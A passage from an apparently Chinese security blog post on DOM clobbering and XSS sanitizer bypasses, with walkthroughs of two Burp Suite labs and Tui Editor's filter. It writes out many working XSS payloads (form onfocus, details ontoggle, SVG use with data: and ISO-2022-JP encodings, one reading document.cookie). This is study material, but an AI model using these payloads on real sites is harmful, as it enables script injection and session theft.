id=&quot;attributes&quot;&gt;&lt;input id=&quot;attributes&quot;&gt;</code></p>\n<p>此时 for 循环中 el.attributes 抓到的是 form 的子标签，form 没有执行循环</p>\n<p>或者</p>\n<p><code>&lt;form tabindex=1 onfocus=&quot;alert(1);this.removeAttribute('onfocus');&quot; autofocus=true&gt; &lt;img id=attributes&gt;&lt;img id=attributes&gt;&lt;/form&gt;</code></p>\n<p><code>&lt;form tabindex=1 onfocus=&quot;alert(1);this.removeAttribute('onfocus');&quot; autofocus=true&gt; &lt;input id=attributes&gt;&lt;input id=attributes&gt;&lt;/form&gt;</code></p>\n<p>tabindex 的作用：</p>\n<p>设置 tab 选中的标签，tabindex=1 或 - 1，代表开始就选中，如果只有一个，只要有 tabindex 默认就选中</p>\n<p>需要两个 input 因为有两个 input 时组成了一个 htmlcollection，是可迭代对象。删除 name 的属性后 input 标签仍然可以 onfocus 实现弹窗</p>\n<p>onfoucs 是 input 属性，form 中必须有 input 才能聚焦</p>\n<p>method 3. 利用 details 弹窗</p>\n<p><code>ParseAttribute</code>  正是在解析文档处理标签属性的时候被调用的。注释也写到了，分发 toggle 事件的操作是异步的。</p>\n<p><strong>details 标签的 toggle 事件是异步触发的，并且直接对 details 标签的移除不会清除原先通过属性设置的异步任务</strong></p>\n<p>将 details 改为同步执行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">data</span> = <span class=\"title function_ invoke__\">decodeURIComponent</span>(location.hash.<span class=\"title function_ invoke__\">substr</span>(<span class=\"number\">1</span>));;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">root</span> = document.<span class=\"title function_ invoke__\">createElement</span>(<span class=\"string\">&#x27;div&#x27;</span>);</span><br><span class=\"line\">root.innerHTML = data;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">setTimeout</span>( () =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (let el of root.<span class=\"title function_ invoke__\">querySelectorAll</span>(<span class=\"string\">&#x27;*&#x27;</span>)) &#123;</span><br><span class=\"line\">     let attrs = [];</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let attr of el.attributes) &#123;</span><br><span class=\"line\">      attrs.<span class=\"title function_ invoke__\">push</span>(attr.name);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let name of attrs) &#123;</span><br><span class=\"line\">      el.<span class=\"title function_ invoke__\">removeAttribute</span>(name);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">    &#125;    </span><br><span class=\"line\">    document.body.<span class=\"title function_ invoke__\">appendChild</span>(root)</span><br><span class=\"line\">&#125; , <span class=\"number\">2000</span>)</span><br></pre></td></tr></table></figure>\n<p>这样保证了 alert 一定会在 js 删除之前执行，执行点在 innerHTML</p>\n<p>如果没有弹出，可能在 js 删除之后才执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const data = decodeURIComponent(location.hash.substr(1));;</span><br><span class=\"line\">const root = document.createElement(&#x27;div&#x27;);</span><br><span class=\"line\">root.innerHTML = data;</span><br><span class=\"line\"></span><br><span class=\"line\">let details = root.querySelector(&quot;details&quot;)</span><br><span class=\"line\">root.removeChild(details)</span><br><span class=\"line\"></span><br><span class=\"line\">for (let el of root.querySelectorAll(&#x27;*&#x27;)) &#123;</span><br><span class=\"line\"> let attrs = [];</span><br><span class=\"line\"> for (let attr of el.attributes) &#123;</span><br><span class=\"line\">  attrs.push(attr.name);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> for (let name of attrs) &#123;</span><br><span class=\"line\">  el.removeAttribute(name);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>details 异步执行是将执行函数放入一个事件队列中，只要事件不停止，在放入事件队列中，删除 details 已经没用，事件队列仍会执行</p>\n<p>details 有延迟的话肯定执行成功，因为此时异步事件已经执行完成，执行点在 innerhtml 如果没有延迟，有可能在 js 删除属性之后，异步事件才执行完成</p>\n<h2 id=\"dom-clobbering-burp-suite\"><a class=\"markdownIt-Anchor\" href=\"#dom-clobbering-burp-suite\">#</a> Dom Clobbering - Burp Suite</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4MDkwNjM2NzktYzAxY2IzM2EtYWQ2MS00ZTg0LTg2MTgtZGU1M2E4MjI4YjU4Lm1k\">📎Exploiting DOM clobbering to enable XSS.md</span></p>\n<h3 id=\"lab-exploiting-dom-clobbering-to-enable-xss\"><a class=\"markdownIt-Anchor\" href=\"#lab-exploiting-dom-clobbering-to-enable-xss\">#</a> Lab: Exploiting DOM clobbering to enable XSS</h3>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function displayComments(comments) &#123;</span><br><span class=\"line\">    let userComments = document.getElementById(&quot;user-comments&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    for (let i = 0; i &lt; comments.length; ++i)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        comment = comments[i];</span><br><span class=\"line\">        let commentSection = document.createElement(&quot;section&quot;);</span><br><span class=\"line\">        commentSection.setAttribute(&quot;class&quot;, &quot;comment&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        let firstPElement = document.createElement(&quot;p&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        let defaultAvatar = window.defaultAvatar || &#123;avatar: &#x27;/resources/images/avatarDefault.svg&#x27;&#125;</span><br><span class=\"line\">        let avatarImgHTML = &#x27;<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;avatar&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;&#x27; + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + &#x27;&quot;</span>&gt;</span>&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">        let divImgContainer = document.createElement(&quot;div&quot;);</span><br><span class=\"line\">        divImgContainer.innerHTML = avatarImgHTML</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">test1</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">test1</span> <span class=\"attr\">name</span>=<span class=\"string\">test2</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">返回HTMLCollection(2) [a#test1, a#test1, test1: a#test1, test2: a#test1]</span><br><span class=\"line\">通过test1取到collections中，test2取到第二个a</span><br><span class=\"line\">--&gt; window.test1.test2</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;test1&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;test2&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">--&gt; node.attributes.length </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a id=defaultAvatar&gt;&lt;a id=defaultAvatar name=avatar href=&quot;cid:&amp;quot;onerror=alert(2)&quot;//&gt;</span><br><span class=\"line\">&lt;a id=defaultAvatar href=&quot;&quot;&gt;</span><br><span class=\"line\">&lt;a id=defaultAvatar name=avatar href=&quot;1:&amp;quot;onerror=alert(1)//&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>这里很明显我们可以用 Dom Clobbering 来控制  <code>window.defaultAvatar</code> ，只要我们原来没有头像就可以用一个构造一个 <code>defaultAvatar.avatar</code>  进行 XSS 了。</p>\n<p>触发后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img class=&quot;avatar&quot; src=&quot;cid:&quot; onerror=&quot;alert(1)&quot;//&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>href 中的内容需要符合 dompurify 中的协议</p>\n<p>至于为什么要用 a 标签，在 ok boomer 中有详细解释，因为 a 标签不继承 tostring 方法</p>\n<p>在 <code>&lt;a&gt;</code>  元素的情况下， <code>toString</code>  只返回一个 <code>href</code>  属性值。最终把 href 中的内容放入 img 的 src 中</p>\n<h3 id=\"labclobbering-dom-attributes-to-bypass-html-filters\"><a class=\"markdownIt-Anchor\" href=\"#labclobbering-dom-attributes-to-bypass-html-filters\">#</a> Lab:Clobbering DOM attributes to bypass HTML filters</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTMLJanitor.prototype.clean = function (html) &#123;</span><br><span class=\"line\">const sandbox = document.implementation.createHTMLDocument(&#x27;&#x27;);</span><br><span class=\"line\">const root = sandbox.createElement(&quot;div&quot;);</span><br><span class=\"line\">root.innerHTML = html;</span><br><span class=\"line\"></span><br><span class=\"line\">this._sanitize(sandbox, root);</span><br><span class=\"line\"></span><br><span class=\"line\">return root.innerHTML;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">HTMLJanitor</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">_sanitize</span> = <span class=\"keyword\">function</span> (<span class=\"params\"><span class=\"variable language_\">document</span>, parentNode</span>) &#123;                                                                           </span><br><span class=\"line\"><span class=\"keyword\">var</span> treeWalker = <span class=\"title function_\">createTreeWalker</span>(<span class=\"variable language_\">document</span>, parentNode);</span><br><span class=\"line\"><span class=\"keyword\">var</span> node = treeWalker.<span class=\"title function_\">firstChild</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!node) &#123; <span class=\"keyword\">return</span>; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (node.<span class=\"property\">nodeType</span> === <span class=\"title class_\">Node</span>.<span class=\"property\">TEXT_NODE</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// If this text node is just whitespace and the previous or next element</span></span><br><span class=\"line\">    <span class=\"comment\">// sibling is a block element, remove it</span></span><br><span class=\"line\">    <span class=\"comment\">// N.B.: This heuristic could change. Very specific to a bug with</span></span><br><span class=\"line\">    <span class=\"comment\">// `contenteditable` in Firefox: http://jsbin.com/EyuKase/1/edit?js,output</span></span><br><span class=\"line\">    <span class=\"comment\">// <span class=\"doctag\">FIXME:</span> make this an option?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (node.<span class=\"property\">data</span>.<span class=\"title function_\">trim</span>() === <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">        &amp;&amp; ((node.<span class=\"property\">previousElementSibling</span> &amp;&amp; <span class=\"title function_\">isBlockElement</span>(node.<span class=\"property\">previousElementSibling</span>))</span><br><span class=\"line\">             || (node.<span class=\"property\">nextElementSibling</span> &amp;&amp; <span class=\"title function_\">isBlockElement</span>(node.<span class=\"property\">nextElementSibling</span>)))) &#123;</span><br><span class=\"line\">      parentNode.<span class=\"title function_\">removeChild</span>(node);</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"title function_\">_sanitize</span>(<span class=\"variable language_\">document</span>, parentNode);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Remove all comments</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (node.<span class=\"property\">nodeType</span> === <span class=\"title class_\">Node</span>.<span class=\"property\">COMMENT_NODE</span>) &#123;</span><br><span class=\"line\">    parentNode.<span class=\"title function_\">removeChild</span>(node);</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"title function_\">_sanitize</span>(<span class=\"variable language_\">document</span>, parentNode);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> isInline = <span class=\"title function_\">isInlineElement</span>(node);</span><br><span class=\"line\">  <span class=\"keyword\">var</span> containsBlockElement;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (isInline) &#123;</span><br><span class=\"line\">    containsBlockElement = <span class=\"title class_\">Array</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">some</span>.<span class=\"title function_\">call</span>(node.<span class=\"property\">childNodes</span>, isBlockElement);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Block elements should not be nested (e.g. &lt;li&gt;&lt;p&gt;...); if</span></span><br><span class=\"line\">  <span class=\"comment\">// they are, we want to unwrap the inner block element.</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> isNotTopContainer = !! parentNode.<span class=\"property\">parentNode</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> isNestedBlockElement =</span><br><span class=\"line\">        <span class=\"title function_\">isBlockElement</span>(parentNode) &amp;&amp;</span><br><span class=\"line\">        <span class=\"title function_\">isBlockElement</span>(node) &amp;&amp;</span><br><span class=\"line\">        isNotTopContainer;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> nodeName = node.<span class=\"property\">nodeName</span>.<span class=\"title function_\">toLowerCase</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> allowedAttrs = <span class=\"title function_\">getAllowedAttrs</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">config</span>, nodeName, node);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> isInvalid = isInline &amp;&amp; containsBlockElement;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Drop tag entirely according to the whitelist *and* if the markup</span></span><br><span class=\"line\">  <span class=\"comment\">// is invalid.</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (isInvalid || <span class=\"title function_\">shouldRejectNode</span>(node, allowedAttrs)</span><br><span class=\"line\">      || (!<span class=\"variable language_\">this</span>.<span class=\"property\">config</span>.<span class=\"property\">keepNestedBlockElements</span> &amp;&amp; isNestedBlockElement)) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Do not keep the inner text of SCRIPT/STYLE elements.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (! (node.<span class=\"property\">nodeName</span> === <span class=\"string\">&#x27;SCRIPT&#x27;</span> || node.<span class=\"property\">nodeName</span> === <span class=\"string\">&#x27;STYLE&#x27;</span>)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">while</span> (node.<span class=\"property\">childNodes</span>.<span class=\"property\">length</span> &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        parentNode.<span class=\"title function_\">insertBefore</span>(node.<span class=\"property\">childNodes</span>[<span class=\"number\">0</span>], node);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    parentNode.<span class=\"title function_\">removeChild</span>(node);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"title function_\">_sanitize</span>(<span class=\"variable language_\">document</span>, parentNode);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Sanitize attributes</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> a = <span class=\"number\">0</span>; a &lt; node.<span class=\"property\">attributes</span>.<span class=\"property\">length</span>; a += <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> attr = node.<span class=\"property\">attributes</span>[a];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_\">shouldRejectAttr</span>(attr, allowedAttrs, node)) &#123;</span><br><span class=\"line\">      node.<span class=\"title function_\">removeAttribute</span>(attr.<span class=\"property\">name</span>);</span><br><span class=\"line\">      <span class=\"comment\">// Shift the array to continue looping.</span></span><br><span class=\"line\">      a = a - <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Sanitize children</span></span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"title function_\">_sanitize</span>(<span class=\"variable language_\">document</span>, node);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">while</span> ((node = treeWalker.<span class=\"title function_\">nextSibling</span>()));</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=x tabindex=0 onfocus=alert(document.cookie)&gt;&lt;input id=attributes&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"tui_editor\"><a class=\"markdownIt-Anchor\" href=\"#tui_editor\">#</a> Tui_editor</h2>\n<p>常见的 Markdown 渲染器对于 XSS 问题有两种处理方式：</p>\n<ul>\n<li>在渲染的时候格外注意，在写入标签和属性的时候进行实体编码</li>\n<li>渲染时不做任何处理，渲染完成以后再将整个数据作为富文本进行过滤</li>\n</ul>\n<p>相比起来，后一种方式更加安全（它的安全主要取决于富文本过滤器的安全性）。前一种方式的优势是，不会因为二次过滤导致丢失一些正常的属性，另外少了一遍处理效率肯定会更高，它的缺点是一不注意就可能出问题，另外也不支持直接在 Markdown 里插入 HTML。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4MTQwMDM2NTItZWUzMDYwMjItZTMxMS00N2Y5LWJkYjYtYzAzOWYwN2NmMTNmLm1k\">📎Tui Editor 的 bypass 之路.md</span></p>\n<blockquote>\n<p>过滤过程是：</p>\n<ol>\n<li>先正则直接去除注释与 onload 属性的内容</li>\n<li>将上面处理后的内容，赋值给一个新创建的 div 的 innerHTML 属性，建立起一颗 DOM 树</li>\n<li>用黑名单删除掉一些危险 DOM 节点，比如 iframe、script 等</li>\n<li>用白名单对属性进行一遍处理，处理逻辑是\n<ul>\n<li>只保留白名单里名字<strong>开头</strong>的属性</li>\n<li>对于满足正则 <code>/href|src|background/i</code>  的属性，进行额外处理</li>\n</ul>\n</li>\n<li>处理完成后的 DOM，获取其 HTML 代码返回</li>\n</ol>\n</blockquote>\n<p>绕过 1：</p>\n<p>使用 SVG 的 use 标签，use 的作用是引用本页面或第三方页面的另一个 svg 元素，比如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;</span><br><span class=\"line\">    &lt;circle id=&quot;myCircle&quot; cx=&quot;5&quot; cy=&quot;5&quot; r=&quot;4&quot; stroke=&quot;blue&quot;/&gt;</span><br><span class=\"line\">    &lt;use href=&quot;#myCircle&quot;&gt;&lt;/use&gt;</span><br><span class=\"line\">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>use 的 href 属性指向那个被它引用的元素。但与 a 标签的 href 属性不同的是，use href 不能使用 JavaScript 伪协议，但可以使用 data: 协议。</p>\n<p>比如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;use href=&quot;data:image/svg+xml,&lt;svg id=&#x27;x&#x27; xmlns=&#x27;http://www.w3.org/2000/svg&#x27; xmlns:xlink=&#x27;http://www.w3.org/1999/xlink&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27;&gt;&lt;a xlink:href=&#x27;javascript:alert(1)&#x27;&gt;&lt;rect x=&#x27;0&#x27; y=&#x27;0&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27; /&gt;&lt;/a&gt;&lt;/svg&gt;#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>data 协议中的文件必须是一个完整的 svg，而且整个 data URL 的末尾，需要有一个锚点 <code>#x</code>  来指向内部这个被引用的 svg。</p>\n<p>对于 XSS sanitizer 来说，这个 Payload 只有 svg、use 两个标签和 href 一个属性，但因为 use 的引用特性，所以 data 协议内部的 svg 也会被渲染出来。</p>\n<p>data 协议，base64 编码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;use href=&quot;data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyAKICAgIHhtbG5zOnhsaW5rPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rJyB3aWR0aD0nMTAwJyBoZWlnaHQ9JzEwMCc+PGEgeGxpbms6aHJlZj0namF2YXNjcmlwdDphbGVydCgxKSc+PHJlY3QgeD0nMCcgeT0nMCcgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnIC8+PC9hPjwvc3ZnPg#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>绕过 2：</p>\n<p>ISO-2022-JP 编码</p>\n<p>ISO-2022-JP 编码在解析的时候会忽略 <code>\\x1B\\x28\\x42</code> ，也就是 <code>%1B%28B</code> 。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;use href=&quot;data:image/svg+xml;charset=ISO-2022-JP,&lt;svg id=&#x27;x&#x27; xmlns=&#x27;http://www.w3.org/2000/svg&#x27; xmlns:xlink=&#x27;http://www.w3.org/1999/xlink&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27;&gt;&lt;a xlink:href=&#x27;javas%1B%28Bcript:alert(1)&#x27;&gt;&lt;rect x=&#x27;0&#x27; y=&#x27;0&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27; /&gt;&lt;/a&gt;&lt;/svg&gt;#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>即三种方式</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">base64</span><br><span class=\"line\">Chrome ISO-<span class=\"number\">2022</span>-JP</span><br><span class=\"line\">&lt;details ontoggle=<span class=\"string\">&quot;alert(1)&quot;</span>&gt; </span><br></pre></td></tr></table></figure>\n<p>或</p>\n<p>通过条件竞争</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;svg onload=alert(1)&gt;</span><br><span class=\"line\">&lt;details open ontoggle=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p>补丁绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export const TAG_NAME = &#x27;[A-Za-z][A-Za-z0-9-]*&#x27;;</span><br><span class=\"line\">const reXSSOnload = new RegExp(`(&lt;$&#123;TAG_NAME&#125;[^&gt;]*)(onload\\s*=)`, &#x27;ig&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">export function sanitizeHTML(html: string) &#123;</span><br><span class=\"line\">    const root = document.createElement(&#x27;div&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if (isString(html)) &#123;</span><br><span class=\"line\">        html = html.replace(reComment, 